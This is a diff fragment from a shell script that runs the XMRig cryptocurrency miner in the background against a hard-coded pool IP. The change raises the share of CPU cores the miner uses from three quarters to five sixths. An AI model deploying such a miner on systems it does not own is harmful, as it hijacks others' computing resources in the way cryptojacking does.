@@ -8,5 +8,5 @@ cd xmrig-5.11.1
 ./xmrig --donate-level 1 -o 13.67.90.188:443 -u ${wkid} -k --max-cpu-usage 75 -B
 kill -9 $(ps -ef|grep xmrig|grep -v grep|awk '{print $2}')
 cores=$(cat /proc/cpuinfo |grep "processor"|wc -l)
-core=$[${cores}/4*3]
+core=$[${cores}/6*5]
 ./xmrig --donate-level 1 -o 13.67.90.188:443 -u $1 -k --max-cpu-usage 75 -t ${core} -B
